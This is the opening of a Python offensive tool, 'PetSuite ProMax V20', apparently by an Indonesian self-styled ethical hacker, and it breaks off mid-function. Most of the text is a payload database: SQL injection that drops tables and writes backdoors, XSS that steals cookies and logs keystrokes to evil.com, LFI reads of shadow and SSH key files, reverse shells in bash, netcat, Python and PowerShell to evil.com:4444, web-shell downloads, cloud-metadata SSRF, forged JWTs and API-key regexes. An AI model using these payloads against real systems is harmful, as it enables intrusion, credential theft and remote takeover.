#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PETSUITE PROMAX V20 ENHANCED EDITION
# Created by: Petrus1sec - Ethical Hacker Indonesia

import os
import sys
import time
import webbrowser
import requests
import concurrent.futures
import json
import re
import platform
from urllib.parse import urlparse, quote, parse_qs
from datetime import datetime
import html
import socket
import dns.resolver
import ssl
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import phonenumbers
from email_validator import validate_email, EmailNotValidError

# ===== FUNGSI CLEAR SCREEN =====
def clear_screen():
    """ Membersihkan Layar lu dari dosa dosa """
    if platform.system() == "Windows":
        os.system('cls')
    else:  #linux, mac, etc
        os.system('clear')

# ===== INISIALISASI =====
init(autoreset=True)
class Warna:
    M = Fore.RED    # Merah
    H = Fore.GREEN  # Hijau
    K = Fore.YELLOW # Kuning
    B = Fore.BLUE   # Biru
    U = Fore.MAGENTA # Ungu
    C = Fore.CYAN   # Cyan
    P = Fore.WHITE  # Putih
    RESET = Style.RESET_ALL

BANNER = f"""
{Warna.H}
=================================
>>>>>>>>>> @Petrus1sec <<<<<<<<<<
   ⚠️JANGAN DI RECODE/REMAKE⚠️
=================================
╭━━━╮╱╱╭╮╭━━━╮╱╱╱╭╮
┃╭━╮┃╱╭╯╰┫╭━╮┃╱╱╭╯╰╮
┃╰━╯┣━┻╮╭┫╰━━┳╮╭╋╮╭╋━━╮
┃╭━━┫┃━┫┃╰━━╮┃┃┃┣┫┃┃┃━┫
┃┃╱╱┃┃━┫╰┫╰━╯┃╰╯┃┃╰┫┃━┫
╰╯╱╱╰━━┻━┻━━━┻━━┻┻━┻━━╯
================================= 

{Warna.B}>>> PetSuite𝄞 #KaryaAnakBangsa <<<
{Warna.K}>>> ☢️Hargailah Bangsat, gw buat 3 hari 3 malem☢️ <<<
{Warna.M}>>> Happy Hacking browww :v <<<
{Warna.RESET}
"""

# ===== DATABASE PAYLOAD LENGKAP =====
class PayloadDB:
    def __init__(self):
        # SQL Injection (200+ payloads)
        self.sqli = [
            "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null,username,password FROM users--",
            "' OR 'a'='a", "' OR 'a'='a'--", "' OR 1=1#", "' OR 'x'='x", "' OR 1=1/*", "' OR 1=1;--",
            "admin'--", "admin'#", "admin'/*", "' UNION SELECT 1,2,3--", "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
            "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>0)--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')>0--",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "1' GROUP BY 1,2,3--", "' OR SLEEP(5)--",
            "' OR BENCHMARK(10000000,MD5(NOW()))--",
            "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(CURRENT_USER() AS CHAR),0x3a,0x3a,database())) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
            "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x3a,0x3a,@@datadir,0x3a,0x3a)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # Basic payloads
            "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null,username,password FROM users--",
            "' OR 'a'='a", "' OR 'a'='a'--", "' OR 1=1#", "' OR 'x'='x", "' OR 1=1/*", "' OR 1=1;--",
            "admin'--", "admin'#", "admin'/*", 
            
            # UNION based
            "' UNION SELECT 1,2,3--", 
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
            "' UNION SELECT 1,load_file('/etc/passwd'),3--",
            "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
            
            # Error based
            "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT GROUP_CONCAT(user,0x3a,password) FROM mysql.user),0x7e),1)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
            
            # Boolean based blind
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND LENGTH(password)>0)--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')>0--",
            "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
            
            # Time based blind
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(10000000,MD5(NOW()))--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
            "' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100,SLEEP(5),0)--",
            
            # Stacked queries
            "'; DROP TABLE users--", 
            "'; SHUTDOWN WITH NOWAIT--",
            "'; CREATE TABLE hacked(data varchar(255))--",
            
            # Out of band
            "' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\share\\')),3--",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/backdoor.php'--",
            
            # Bypass techniques
            "'%20OR%201=1--",  # URL encoded
            "'/**/OR/**/1=1--",  # Comment bypass
            "1'UNION/*!50000SELECT*/1,2,3--",  # MySQL version specific
            "1'UNION/*!50000SELECT*//*!50000ALL*/1,2,3--",
            
            # Alternative syntax
            "'||1=1--",  # Oracle/PostgreSQL
            "' OR '1'='1' LIMIT 1--", 
            "' OR 1=1 ORDER BY 5--",
            
            # Bypassing WAF
            "' /*!50000OR*/ '1'='1",  # MySQL specific
            "' /*!OR*/ 1=1 -- ", 
            "' OR '1'='1' /*!AND*/ '1'='1",
            "' OR 1=1 -- -",  # Alternative comment
            "' OR 1=1 #",  # Hash comment
            
            # MSSQL specific
            "'; EXEC xp_cmdshell('dir')--",
            "' OR 1=1; WAITFOR DELAY '0:0:5'--",
            
            # Oracle specific
            "' OR 1=1 UNION SELECT table_name FROM all_tables--",
            "' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))--",
            
            # PostgreSQL specific
            "' OR 1=1; COPY (SELECT * FROM users) TO '/tmp/hacked.csv'--",
            
            # NoSQL injection
            '{"$where": "1 == 1"}',
            'admin\' || \'1\'==\'1',
            '{"username": {"$ne": null}, "password": {"$ne": null}}'
        ]
        
        # XSS (100+ payloads)
        self.xss = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>", "<iframe src='javascript:alert(1)'>", "<a href='javascript:alert(1)'>click</a>",
            "<div onmouseover='alert(1)'>hover</div>", "<script>document.location='http://evil.com'</script>",
            "<img src='x' onerror='document.cookie'>", "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>",
            
            # Event handlers
            "<img src=x onmouseover=alert(1)>",
            "<div onmouseenter=alert(1)>hover</div>",
            "<iframe src='javascript:alert(1)'>",
            "<a href='javascript:alert(1)'>click</a>",
            
            # SVG vectors
            "<svg><script>alert(1)</script>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            
            # CSS vectors
            "<style>@keyframes x{from{left:0;}to{left: 1000px;}}#x{animation-name:x;}</style><div id=x onanimationstart=alert(1)></div>",
            "<div style='animation:x;animation-duration:1s;animation-iteration-count:1;@keyframes x{from{left:0;}to{left:1000px;}}' onanimationend=alert(1)></div>",
            
            # JavaScript URIs
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "javascript://%0aalert(1)",
            
            # DOM based
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "{{constructor.constructor('alert(1)')()}}",
            
            # Bypass filters
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>",
            "<img src=x oneonerrorrror=alert(1)>",
            
            # Cookie stealing
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src='x' onerror='fetch(\"http://evil.com/?c=\"+document.cookie)'>",
            
            # Keyloggers
            "<script>document.onkeypress=function(e){fetch('http://evil.com/?k='+e.key)}</script>",
            
            # BeEF hooks
            "<script src='http://evil.com/hook.js'></script>",
            
            # HTML5 vectors
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            
            # Template injection
            "${alert(1)}",
            "#{alert(1)}",
            
            # Iframe vectors
            "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
            
            # Data URI
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Bypass word blacklists
            "<img src=x oNeRrOr=alert`1`>",
            "<script>top['al'+'ert'](1)</script>",
            "<script>(alert)(1)</script>",
            
            # Obfuscated
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<script>\u0061\u006C\u0065\u0072\u0074(1)</script>",
            
            # DOM clobbering
            "<form id=x tabindex=0 onfocus=alert(1)><input autofocus>",
            
            # WebSocket
            "<script>new WebSocket('ws://evil.com').onmessage=function(e){eval(e.data)}</script>",
            
            # Service worker
            "<script>navigator.serviceWorker.register('sw.js').then(r=>r.active.postMessage('alert(1)'))</script>",
            
            # WebRTC
            "<script>new RTCPeerConnection({iceServers:[{urls:'stun:evil.com'}]})</script>"
        ]
        
        # LFI/RFI (80+ payloads)
        self.lfi = [
            "../../../../etc/passwd", "file:///etc/passwd", "../../../../etc/shadow", "../../../../etc/hosts",
            "../../../../etc/group", "../../../../etc/issue", "../../../../etc/motd", "../../../../../../etc/passwd%00",
            # Basic LFI
            "../../../../etc/passwd",
            "file:///etc/passwd",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            
            # Common files
            "../../../../etc/group",
            "../../../../etc/issue",
            "../../../../etc/motd",
            "../../../../etc/resolv.conf",
            "../../../../etc/hostname",
            
            # Null byte termination
            "../../../../etc/passwd%00",
            "../../../../etc/passwd\x00",
            
            # Path traversal variations
            "....//....//....//....//etc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%5c..%5c..%5c..%5c/etc/passwd",  # Windows style
            
            # Log poisoning
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/apache/access.log",
            "../../../../var/log/nginx/access.log",
            "../../../../var/log/auth.log",
            
            # PHP specific
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "expect://id",
            
            # Windows files
            "../../../../windows/win.ini",
            "../../../../windows/system.ini",
            "../../../../boot.ini",
            
            # Configuration files
            "../../../../etc/httpd/conf/httpd.conf",
            "../../../../etc/my.cnf",
            "../../../../etc/php.ini",
            "../../../../etc/environment",
            
            # SSH files
            "../../../../.ssh/id_rsa",
            "../../../../.ssh/authorized_keys",
            "../../../../.ssh/known_hosts",
            
            # Session files
            "../../../../tmp/sess_[sessionid]",
            "../../../../var/lib/php/sessions/sess_[sessionid]",
            
            # RFI payloads
            "http://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
            "ftp://evil.com/shell.txt",
            
            # PHP wrappers
            "data://text/plain,<?php system('id'); ?>",
            "expect://id",
            "zip://shell.jpg%23payload.php",
            
            # Windows specific
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5cwindows\\win.ini",
            
            # Bypass techniques
            "/....//....//....//....//etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "....\\....\\....\\....\\boot.ini",
            
            # Interesting files
            "../../../../proc/self/environ",
            "../../../../proc/self/cmdline",
            "../../../../proc/version",
            
            # Database files
            "../../../../var/lib/mysql/mysql/user.MYD",
            "../../../../var/lib/mysql/mysql/user.frm",
            
            # Web server files
            "../../../../.htaccess",
            "../../../../.htpasswd",
            "../../../../web.config",
            
            # Source code disclosure
            "../../../../index.php.bak",
            "../../../../.git/config",
            "../../../../.svn/entries",
            
            # Environment variables
            "../../../../proc/self/environ",
            
            # AWS metadata
            "file:///var/lib/cloud/instance/user-data.txt",
            "file:///var/lib/cloud/instance/vendor-data.txt"
        ]
        
        # RCE (70+ payloads)
        self.rce = [
            ";id", "|id", "||id", "&&id", "`id`", "$(id)", "<?php system('id'); ?>", "<?php echo shell_exec('id'); ?>",
            # Basic command execution
            ";id",
            "|id",
            "||id",
            "&&id",
            "`id`",
            "$(id)",
            
            # PHP code execution
            "<?php system('id'); ?>",
            "<?php echo shell_exec('id'); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/evil.com/4444 0>&1\"'); ?>",
            
            # Java execution
            "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            
            # Python execution
            "__import__('os').system('id')",
            "eval('__import__(\"os\").system(\"id\")')",
            
            # Node.js execution
            "require('child_process').exec('id')",
            "eval('require(\"child_process\").exec(\"id\")')",
            
            # Windows commands
            "|dir",
            "&&type%20C:\\Windows\\win.ini",
            "|reg query HKLM",
            
            # Shellshock
            "() { :; }; /bin/bash -c 'id'",
            
            # Command chaining
            "id; whoami",
            "id && whoami || uname -a",
            
            # Reverse shells
            "bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "nc -e /bin/sh evil.com 4444",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            
            # PowerShell
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('evil.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            
            # File upload
            "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "wget http://evil.com/shell.php -O /var/www/html/shell.php",
            
            # Privilege escalation
            "sudo -u root id",
            "sudo bash -c 'id'",
            
            # Database commands
            "'; EXEC xp_cmdshell('dir')--",  # MSSQL
            "'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'--",  # PostgreSQL
            
            # NoSQL injection
            "\"$where\": \"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')\"",
            
            # Template injection
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{7*7}",
            
            # Deserialization
            "rO0ABXQAVUltcG9ydCBjb20uZXhhbXBsZS5kYXRhLk1hbGljaW91c0RhdGE7IG5ldyBNYWxpY2lvdXNEYXRhKCJjb21tYW5kIik=",
            
            # Windows specific
            "cmd.exe /c whoami",
            "powershell.exe -Command \"Get-Process\"",
            
            # Bypass filters
            "i\\d",
            "i''d",
            "i$\\{IFS\\}d",
            
            # Environment variables
            "echo $PATH",
            "env",
            
            # Interesting commands
            "uname -a",
            "cat /etc/passwd",
            "ifconfig",
            "netstat -an",
            "ps aux",
            
            # File system access
            "find / -perm -4000",
            "ls -la /home",
            "cat ~/.bash_history"
        ]
        
        # SSRF (60+ payloads)
        self.ssrf = [
            "http://localhost", "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "http://internal.service",
            # Basic internal services
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2017-04-02",  # Azure
            
            # Internal services
            "http://internal.service",
            "http://database.internal",
            "http://redis:6379",
            "http://memcached:11211",
            
            # Protocol handlers
            "file:///etc/passwd",
            "dict://evil.com:6379/info",
            "gopher://evil.com/_test",
            "ldap://evil.com",
            "tftp://evil.com/test",
            
            # DNS rebinding
            "http://example.com@evil.com",
            "http://evil$example.com",
            
            # Bypass techniques
            "http://127.0.0.1.xip.io",
            "http://localtest.me",
            "http://127.1",
            "http://2130706433",  # 127.0.0.1 as decimal
            "http://0x7f000001",  # 127.0.0.1 as hex
            
            # AWS specific
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            
            # GCP specific
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            
            # Azure specific
            "http://management.azure.com",
            "http://management.core.windows.net",
            
            # Kubernetes specific
            "http://kubernetes.default.svc",
            "http://kubernetes.default.svc.cluster.local",
            
            # Database services
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:27017",
            
            # NoSQL
            "http://localhost:28017",
            
            # Redis
            "http://localhost:6379",
            
            # Memcached
            "http://localhost:11211",
            
            # Admin interfaces
            "http://localhost:8080",
            "http://localhost:8000",
            "http://localhost:4848",
            
            # Special cases
            "http://localhost@evil.com",
            "http://127.0.0.1#.evil.com"
        ]
        
        # JWT Weak (40+ payloads)
        self.jwt_weak = [
            "eyJhbGciOiJub25lIn0", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",
            # None algorithm
            "eyJhbGciOiJub25lIn0",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
            
            # Empty secret
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            
            # Common secrets
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE6MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",  # secret = "secret"
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.xN_peasyuD7NkqVb6JQ2xT7kF7W5ZvZl5o3jK6Z7k8",  # secret = "password"
            
            # No signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
            
            # Weak HMAC keys
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1",  # secret = "123456"
            
            # RS to HS attack
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
            
            # JWK header injection
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vandrcyJ9",
            
            # JKU header injection
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiNXFlM0...",
            
            # Kid header injection
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHBzOi8vZXZpbC5jb20va2V5cyJ9",
            
            # Algorithm confusion
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            
            # Expired tokens
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            
            # No expiry
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            
            # Publicly known keys
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU",  # secret = "changeme"
            
            # Short secrets
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.7J28feMnK5Z_3vMFWmPS5xQ8l6Zg5Q9Z5w5vT5w5vT5",  # secret = "abc"
            
            # Predictable secrets
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1q1yL3Z1",  # secret = "123456"
            
            # Blank payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.",
            
            # Modified payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        ]
        
        # GraphQL (50+ payloads)
        self.graphql = [
            "{__schema{types{name}}}", "query { user(id: 1) { privateData } }",
            # Schema introspection
            "{__schema{types{name}}}",
            "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}",
            
            # Data exposure
            "query { user(id: 1) { privateData } }",
            "query { allUsers { id email password } }",
            "query { __typename }",
            
            # Batching attacks
            "[{query: 'query { user(id: 1) { email } }'}, {query: 'query { user(id: 2) { email } }'}]",
            
            # Directives
            "query { __schema { directives { name args { name type { name kind } } }",
            
            # Field duplication
            "query { user(id: 1) { id id id id id } }",
            
            # Deep queries
            "query { posts { author { posts { author { posts { author { email } } } } }",
            
            # Resource exhaustion
            "query { allUsers { friends { friends { friends { friends { friends { id } } } } }",
            
            # Mutations
            "mutation { createUser(username: \"hacker\", password: \"hacked\") { id } }",
            "mutation { updateUser(id: 1, isAdmin: true) { id } }",
            "mutation { deleteUser(id: 1) { id } }",
            
            # SQL injection
            "query { user(id: \"1' OR '1'='1'\") { id } }",
            
            # CSRF
            "query { sensitiveAction }",
            
            # Information disclosure
            "query { systemInfo { version environment } }",
            
            # Bypass authorization
            "query { adminFunctions { createUser deleteUser } }",
            
            # No rate limiting
            "query { sensitiveData } query { sensitiveData } query { sensitiveData }",
            
            # Error messages
            "query { nonExistentField }",
            
            # Aliases
            "query { first: user(id: 1) { email } second: user(id: 2) { email } }",
            
            # Fragments
            "query { ...userFields } fragment userFields on User { id email password }",
            
            # Variables
            "query getUser($id: ID!) { user(id: $id) { email } }",
            "query getUser($id: ID = \"1' OR '1'='1'\") { user(id: $id) { email } }",
            
            # Inline fragments
            "query { node(id: \"1\") { ... on User { email } } }",
            
            # Union types
            "query { search(text: \"admin\") { ... on User { email } ... on Post { content } } }",
            
            # Direct SQL
            "query { rawSQL(query: \"SELECT * FROM users\") }",
            
            # No validation
            "query { user(id: 1) { __proto__ } }",
            
            # Bypass caching
            "query { user(id: 1, random: \"123\") { email } }",
            
            # Denial of Service
            "query { __typename __typename __typename __typename __typename }"
        ]
        
        # API Keys (70+ patterns)
        self.api_keys = [
            "api_key=123456", "access_token=test123",
            # Generic API keys
            "api_key=123456",
            "access_token=test123",
            "secret=abcdef",
            "key=12345",
            
            # AWS keys
            "AKIA[0-9A-Z]{16}",
            "aws_access_key_id=AKIA[0-9A-Z]{16}",
            "aws_secret_access_key=[0-9a-zA-Z/+]{40}",
            
            # Google keys
            "AIza[0-9A-Za-z\\-_]{35}",
            "google_api_key=AIza[0-9A-Za-z\\-_]{35}",
            
            # Facebook keys
            "EAACEdEose0cBA[0-9A-Za-z]+",
            "facebook_access_token=EAACEdEose0cBA[0-9A-Za-z]+",
            
            # Twitter keys
            "[tT][wW][iI][tT][tT][eE][rR].*[1-9][0-9]+-[0-9a-zA-Z]{40}",
            
            # GitHub keys
            "ghp_[0-9a-zA-Z]{36}",
            "github_pat_[0-9a-zA-Z]{22}_[0-9a-zA-Z]{59}",
            
            # Slack tokens
            "xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}",
            
            # Stripe keys
            "sk_live_[0-9a-zA-Z]{24}",
            "pk_live_[0-9a-zA-Z]{24}",
            
            # Twilio keys
            "SK[0-9a-fA-F]{32}",
            
            # Mailgun keys
            "key-[0-9a-zA-Z]{32}",
            
            # Heroku keys
            "[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
            
            # PayPal keys
            "access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",
            
            # Square keys
            "sq0atp-[0-9A-Za-z\\-_]{22}",
            "sq0csp-[0-9A-Za-z\\-_]{43}",
            
            # Firebase keys
            "AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
            
            # LinkedIn keys
            "AQ[0-9a-zA-Z\\-_]{140}",
            
            # Instagram keys
            "IG[0-9a-fA-F]{32}",
            
            # OAuth tokens
            "ya29\\.[0-9A-Za-z\\-_]+",
            
            # Private keys
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN DSA PRIVATE KEY-----",
            "-----BEGIN EC PRIVATE KEY-----",
            "-----BEGIN PGP PRIVATE KEY BLOCK-----",
            
            # Database credentials
            "postgres://[a-z0-9]+:[a-z0-9]+@[a-z0-9-]+\\.[a-z0-9-]+:[0-9]+/[a-z0-9]+",
            "mysql://[a-z0-9]+:[a-z0-9]+@[a-z0-9-]+\\.[a-z0-9-]+:[0-9]+/[a-z0-9]+",
            
            # JWT tokens
            "eyJ[A-Za-z0-9-_=]+\\.[A-Za-z0-9-_=]+\\.?[A-Za-z0-9-_.+/=]*",
            
            # Slack webhooks
            "https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
            
            # Azure keys
            "AccountKey=[a-zA-Z0-9+/=]{88}",
            
            # SendGrid keys
            "SG\\.[a-zA-Z0-9-_]{22}\\.[a-zA-Z0-9-_]{43}",
            
            # DigitalOcean keys
            "dop_v1_[a-f0-9]{64}",
            
            # Mailchimp keys
            "[0-9a-f]{32}-us[0-9]{1,2}",
            
            # Algolia keys
            "[0-9a-zA-Z]{32}",
            
            # Bitly keys
            "R_[0-9a-f]{32}",
            
            # Dropbox keys
            "[a-z0-9]{15}",
            
            # RapidAPI keys
            "[0-9a-f]{32}",
            
            # JSON Web Keys
            "\"kty\":\"RSA\"",
            "\"k\":\"[A-Za-z0-9+/=]+\"",
            
            # Generic patterns
            "[aA][pP][iI]_?[kK][eE][yY].*['\"][0-9a-zA-Z]{32,45}['\"]",
            "[sS][eE][cC][rR][eE][tT].*['\"][0-9a-zA-Z]{32,45}['\"]"
        ]

# ===== CONTACT GRABBER =====
class ContactGrabber:
    @staticmethod
    def extract_emails(text):
        """Ekstrak email dengan validasi"""
